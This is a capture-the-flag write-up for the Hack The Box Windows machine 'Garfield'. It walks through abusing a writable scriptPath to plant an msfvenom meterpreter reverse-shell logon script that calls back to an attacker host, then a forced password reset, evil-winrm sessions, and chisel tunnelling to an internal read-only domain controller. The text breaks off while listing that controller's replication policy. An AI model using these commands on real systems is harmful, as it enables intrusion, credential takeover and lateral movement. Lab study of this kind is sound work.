---
title: Garfield
os: Windows
difficulty: Hard
tags:
  - Active Directory
  - SYSVOL Logon Script
  - bloodyAD
  - RBCD
  - RODC
  - Key List Attack
  - Mimikatz
  - Rubeus
  - Privilege Escalation
---

# 🛡️ HTB - Garfield (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Garfield
- **Operating System:** Windows Server 2019
- **Difficulty:** Hard
- **Vulnerabilities:** Insecure scriptPath Write Permissions, Active Directory ACL Abuse (ForceChangePassword / addSelf), Resource-Based Constrained Delegation (RBCD), RODC Key List Attack

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.16.212
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-05 14:13 UTC

Nmap scan report for 10.129.16.212
Host is up (0.26s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-05 22:12:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T22:13:25+00:00
|_ssl-date: 2026-04-05T22:14:05+00:00; +7h59m30s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m29s, deviation: 0s, median: 7h59m29s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-04-05T22:13:29
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   246.79 ms 10.10.14.1
2   248.56 ms 10.129.16.212

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.47 seconds
```

- 🔍 *Okay Our favorite AD!!*
- 🔍 *They also provided a username and password to begin with ---> j.arbuckle / Th1sD4mnC4t!@1978*
- 🔍 *Lets look for SMB verification!*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
```

- 🔍 *granted! well as expected*
- 🔍 *Lets list users:*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.16.212   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.16.212   445    DC01             Administrator                 2025-10-03 17:29:26 0       Built-in account for administering the computer/domain
SMB         10.129.16.212   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.16.212   445    DC01             krbtgt                        2025-08-13 11:05:26 0       Key Distribution Center Service Account
SMB         10.129.16.212   445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller
SMB         10.129.16.212   445    DC01             j.arbuckle                    2025-09-09 15:50:55 0
SMB         10.129.16.212   445    DC01             l.wilson                      2026-01-27 21:40:33 0
SMB         10.129.16.212   445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0
SMB         10.129.16.212   445    DC01             [*] Enumerated 7 local users: GARFIELD
```

- 🔍 *l.wilson and l.wilson_adm, interesting!*
- 🔍 *Lets look at some shares as well!*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.16.212   445    DC01             [*] Enumerated shares
SMB         10.129.16.212   445    DC01             Share           Permissions     Remark
SMB         10.129.16.212   445    DC01             -----           -----------     ------
SMB         10.129.16.212   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.212   445    DC01             C$                              Default share
SMB         10.129.16.212   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.212   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.16.212   445    DC01             SYSVOL          READ            Logon server share
```

- 🔍 *we got some read Privileges for IPC$, NETLOGON, and SYSVOL*
- 🔍 *i looked at these Shares, but i don't think there is something to check on*

```bash
smbclient //10.129.16.212/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
```

```text
Try "help" to get a list of possible commands.
smb: \> recursion on
recursion: command not found
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Wed Aug 13 11:04:43 2025
  ..                                  D        0  Wed Aug 13 11:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 11:04:43 2025

\garfield.htb
  .                                   D        0  Wed Aug 13 11:11:05 2025
  ..                                  D        0  Wed Aug 13 11:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 11:11:05 2025
  Policies                            D        0  Wed Aug 13 11:04:48 2025
  scripts                             D        0  Tue Jan 27 22:13:47 2026

\garfield.htb\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \garfield.htb\DfsrPrivate\*

\garfield.htb\Policies
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Wed Aug 13 11:04:48 2025
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\scripts
  .                                   D        0  Tue Jan 27 22:13:47 2026
  ..                                  D        0  Tue Jan 27 22:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 22:20:29 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  GPT.INI                             A       22  Tue Sep  9 15:55:03 2025
  MACHINE                             D        0  Wed Aug 13 11:11:08 2025
  USER                                D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  GPT.INI                             A       23  Sat Feb 14 01:14:50 2026
  MACHINE                             D        0  Tue Sep  9 16:43:51 2025
  USER                                D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Wed Aug 13 11:11:08 2025
  ..                                  D        0  Wed Aug 13 11:11:08 2025
  Microsoft                           D        0  Wed Aug 13 11:04:48 2025
  Registry.pol                        A     2792  Wed Aug 13 11:11:08 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Tue Sep  9 16:43:51 2025
  ..                                  D        0  Tue Sep  9 16:43:51 2025
  Microsoft                           D        0  Wed Aug 13 11:04:48 2025
  Scripts                             D        0  Tue Sep  9 16:43:51 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  Windows NT                          D        0  Wed Aug 13 11:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  Windows NT                          D        0  Tue Sep  9 16:44:18 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts
  .                                   D        0  Tue Sep  9 16:43:51 2025
  ..                                  D        0  Tue Sep  9 16:43:51 2025
  Shutdown                            D        0  Tue Sep  9 16:43:51 2025
  Startup                             D        0  Tue Sep  9 16:43:51 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Wed Aug 13 11:04:48 2025
  ..                                  D        0  Wed Aug 13 11:04:48 2025
  SecEdit                             D        0  Tue Sep  9 15:55:03 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Tue Sep  9 16:44:18 2025
  ..                                  D        0  Tue Sep  9 16:44:18 2025
  Audit                               D        0  Tue Sep  9 16:44:18 2025
  SecEdit                             D        0  Sat Feb 14 01:14:50 2026

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\Shutdown
  .                                   D        0  Tue Sep  9 16:43:51 2025
  ..                                  D        0  Tue Sep  9 16:43:51 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\Startup
  .                                   D        0  Tue Sep  9 16:43:51 2025
  ..                                  D        0  Tue Sep  9 16:43:51 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Tue Sep  9 15:55:03 2025
  ..                                  D        0  Tue Sep  9 15:55:03 2025
  GptTmpl.inf                         A     1098  Tue Sep  9 15:55:03 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit
  .                                   D        0  Tue Sep  9 16:44:18 2025
  ..                                  D        0  Tue Sep  9 16:44:18 2025
  audit.csv                           A      535  Tue Sep  9 16:44:34 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Feb 14 01:14:50 2026
  ..                                  D        0  Sat Feb 14 01:14:50 2026
  GptTmpl.inf                         A     3904  Sat Feb 14 01:14:50 2026
```

- 🔍 *while looking at the printDetect.bat file, i have found that, windows has a shared access of \\garfield.htb\\scripts, means all the users inside the domain group can access this share.*
- 🔍 *Now what i have learnt is, that every user has a logon script, means it is a script that runs whenever a user logs in.*
- 🔍 *if we can change, that printDetect.bat file and use something like change password for l.wilson, and then add it as a logon script for l.wilson, we can grant access to user l.wilson*

---

## Step 2 - Enumeration

- 🔍 *Lets First check what are the writeables for the current user!*

```bash
bloodyAD --host DC01.garfield.htb \
    -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
    get writable --detail
```

```text
distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

- 🔍 *The output confirms our above attack strategy, we have write privs over l.wilson's scriptPATH attribute.*

> [!IMPORTANT]
> **scriptPATH Attribute Abuse:**
> scriptPATH attribute is the one which has the logon script that runs as the user logs in, if we can write it means we can change it as well!

---

## Step 3 - Initial Foothold

- 🔍 *first i have tried creating a Reverse shell payload for windows, but it didn't worked.*
- 🔍 *Then i knew that i have to encode it into base64 to be executed.*
- 🔍 *Lets use Metasploit here!*
- 🔍 *Lets first create a .bat file to be uploaded. will create it using Metasploit*

```bash
printf '@echo off\r\n%s\r\n' \
    "$(msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.15.**** LPORT=443 \
    -f psh-cmd | tail -n 1)" \
> log-check.bat
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh-cmd file: 7475 bytes
```

- 🔍 *on the other hand turn on your Metasploit listener*

```bash
sudo msfconsole -q \
    -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

- 🔍 *Then lets just put this file into the share*

```bash
smbclient //garfield.htb/SYSVOL \
    -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
    -c 'cd garfield.htb\scripts; put log-check.bat log-check.bat'
```

- 🔍 *Change the path of l.wilson's logon script to our rev shell script*

```bash
bloodyAD --host DC01.garfield.htb \
    -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
    set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
    scriptPath \
    -v log-check.bat
```

```text
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

- 🔍 *On Listener!*

```text
[*] Started reverse TCP handler on 10.10.15.****:443
[*] Sending stage (230982 bytes) to 10.129.17.250
[*] Meterpreter session 1 opened (10.10.15.****:443 -> 10.129.17.250:61591) at 2026-04-08 14:32:05 +0000
```

```text
meterpreter > shell
Process 4640 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.8389]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ..
cd ..

C:\Windows>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Windows>whoami
whoami
garfield\l.wilson

C:\Windows>
```

- 🔍 *Okay so we got our foothold!*
- 🔍 *Now when i was enumerating bloodhound, i found out that the user l.wilson has ForceChangePassowrd rights on l.wilson_adm, so we can change the password!*

```text
meterpreter > powershell_execute "$pw = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force; Set-ADAccountPassword -Identity 'l.wilson_adm' -Reset -NewPassword $pw"
[+] Command execution completed:
```

> [!NOTE]
> I executed the above command without acquiring any interactive shell as it was causing some display issues of output.

- 🔍 *now Lets confirm if the password has changed or not, and also lets check if this l.wilson_adm has winrm or not.*

```bash
nxc winrm 10.129.31.77 -u l.wilson_adm -p 'NewPassword123!' -d garfield.htb
```

```text
WINRM       10.129.31.77    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
WINRM       10.129.31.77    5985   DC01             [+] garfield.htb\l.wilson_adm:NewPassword123! (Pwn3d!)
```

- 🔍 *Good! as expected!*
- 🔍 *Lets Grab the shell!*

```bash
evil-winrm -i 10.129.31.77  -u 'l.wilson_adm' -p 'NewPassword123!'
```

```text
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> ls


    Directory: C:\Users\l.wilson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/9/2026   3:01 PM             34 user.txt
```

---

## Step 4 - Privilege Escalation

- 🔍 *First thing i took was the bloodhound:*

```text
	l.wilson_adm
	     ↓
          WriteAccountRestrictions
	     ↓
    RODC garfield.htb
```

```text
	l.wilson_adm
	     ↓
                  MemberOf
	     ↓
     Tier1.garfield.htb
	     ↓
	  addSelf
	     ↓
     RODC Administrators@garfield.htb
```

> [!IMPORTANT]
> **What is WriteAccountRestriction?**
> Write Account Restrictions is a sensitive Active Directory (AD) permission allowing a user/group to modify critical security attributes on user or computer objects, specifically the `userAccountControl` attribute. This delegated right allows changing account status (e.g., enabling/disabling, unlocking) and is often required for helpdesk roles to manage passwords and account locks.

- 🔍 *So this attribute only allows us to play around some security attributes despite giving us some concrete pathway to escalate!*
- 🔍 *Now there is only one obvious pathway towards domain escalation, which is the second one*
- 🔍 *l.wilson_adm is member of Tier1.garfield.htb and every member of this group has addSelf rights over the Administrator group.*
- 🔍 *Once we add the l.wilson_adm into Administrators OU then we can gain full control over the DC(RODC).*

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Add-ADGroupMember -Identity "R0DC Administrators@garfield.htb" -Members "l.wilson_adm"
Cannot find an object with identity: 'R0DC Administrators@garfield.htb' under: 'DC=garfield,DC=htb'.
At line:1 char:1
+ Add-ADGroupMember -Identity "R0DC Administrators@garfield.htb" -Membe ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (R0DC Administrators@garfield.htb:ADGroup) [Add-ADGroupMember], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirectory.Management.Commands.AddADGroupMember
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Add-ADGroupMember -Identity "Administrators@garfield.htb" -Members "l.wilson_adm"
Cannot find an object with identity: 'Administrators@garfield.htb' under: 'DC=garfield,DC=htb'.
At line:1 char:1
+ Add-ADGroupMember -Identity "Administrators@garfield.htb" -Members "l ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Administrators@garfield.htb:ADGroup) [Add-ADGroupMember], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirectory.Management.Commands.AddADGroupMember
```

- 🔍 *one thing we didn't get was this RODC thing*

> [!IMPORTANT]
> **What is an RODC?**
> A Read-Only Domain Controller (RODC) is designed for branch or semi-trusted locations that still need directory services. It keeps a filtered copy of AD for LDAP queries, excluding sensitive attributes, and it can cache selected user and computer credentials locally through the Password Replication Policy (PRP) to support authentication.
>
> 1. ** Lite DC:** Think of a Read-Only Domain Controller (RODC) as a "lite" version of a DC. It holds a copy of the Active Directory database but cannot make any changes. It’s like a library that only lets you read books but won't let you write new ones or edit existing ones.
> 2. **Credential Caching (The "Secret Storage"):** To save time, an RODC stores (caches) the passwords of users who log in to it frequently. However, it’s not allowed to store everyone's password (like Domain Admins) because if the RODC is stolen, those high-value passwords would be exposed.
>    - **msDS-RevealOnDemandGroup:** This is the "Allow List." Any user in this list can have their password stored on the RODC.
>    - **msDS-NeverRevealGroup:** This is the "Deny List." Even if you are on the allow list, if you are here (like the Administrator account), the RODC will never store your password.
> 3. **The RODC krbtgt (The "Special Key"):** Standard DCs use a master key (krbtgt) to sign login tickets. Because the RODC isn't fully trusted, it gets its own unique, secondary key (e.g., krbtgt_12345). If you steal this key, you can forge tickets only for that specific RODC.

- 🔍 *means the administrator OU in which we were trying to add ourself is nothing but an RODC with filtered AD and LDAP queries, which excluded all the sensitive attributes, which is the main reason why addSelf didn't worked, and that makes a complete sense!*
- 🔍 *while enumerating i found out that there is a second internal host as well!*

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c4ff:5747:1d3c:fba0%9
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::f957:8f3c:8c89:5e7e
   Link-local IPv6 Address . . . . . : fe80::63db:4b1a:f541:9e52%7
   IPv4 Address. . . . . . . . . . . : 10.129.31.77
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:70fa%7
                                       10.129.0.1
```

- 🔍 *This makes complete sense why our previous AddSelf queries failed and showed "Object Not Found"*
- 🔍 *Scan shows the same AD environment*

```powershell
*Evil-WinRM* PS C:\temp> .\fscan.exe -h 192.168.100.0/24
(icmp) Target 192.168.100.1   is alive
(icmp) Target 192.168.100.2   is alive
[*] Icmp alive hosts len is: 2
192.168.100.2:445 open
192.168.100.2:139 open
192.168.100.2:135 open
192.168.100.1:445 open
192.168.100.1:139 open
192.168.100.1:135 open
192.168.100.2:88 open
192.168.100.1:88 open
[*] alive ports len is: 8
start vulscan
[*] NetInfo
[*]192.168.100.1
  [->]DC01
  [->]192.168.100.1
  [->]10.129.78.103
  [->]dead:beef::def5:b1cf:8d6a:4bc2
[*] NetBios 192.168.100.2   [+] DC:GARFIELD\RODC01
[*] NetInfo
[*]192.168.100.2
  [->]RODC01
  [->]192.168.100.2
```

- 🔍 *I think we should tunnel it up in-order to perform those AD and LDAP queries on this internal host!*
- 🔍 *Start Listener on kali with:*

```bash
./chisel-lin server --reverse --port 8080 --socks5
```

- 🔍 *On windows:*

```cmd
.\chisel.exe client 10.10.14.****:8080 R:socks
```

- 🔍 *you should see something like this:*

```text
2026/04/10 21:57:31 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

- 🔍 *now lets ensure the connection:*

```bash
proxychains crackmapexec smb 192.168.100.2
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
SMB         192.168.100.2   445    RODC01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:RODC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
```

- 🔍 *Connection Succeeded!*
- 🔍 *Lets get the evil-winrm Session now*

```bash
proxychains4 evil-winrm -i 192.168.100.2  -u 'l.wilson_adm' -p 'NewPassword123!'
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
 
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> hostname
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
RODC01
```

- 🔍 *We are in!*
- 🔍 *Now first check Those Allowed and Denied Lists.*

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Allowed
```

```text
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK


DistinguishedName : CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
Name              : Allowed RODC Password Replication Group
ObjectClass       : group
ObjectGUID        : c156f4aa-6307-4c39-9bb1-c639c7bd3719
SamAccountName    : Allowed RODC Password Replication Group
SID               : S-1-5-21-2502726253-3859040611-225969357-571
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Denied
```

```text
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
 
 
DistinguishedName : CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 881d41dc-1a5c-40be-b4a2-e52be9a12f15
SamAccountName    : Backup Operators
SID               : S-1-5-32-551

DistinguishedName : CN=Account Operators,CN=Builtin,DC=garfield,DC=htb
Name              : Account Operators
ObjectClass       : group
ObjectGUID        : c2528fd1-310b-46a0-a713-acba48b52334
SamAccountName    : Account Operators
SID               : S-1-5-32-548

DistinguishedName : CN=Server Operators,CN=Builtin,DC=garfield,DC=htb
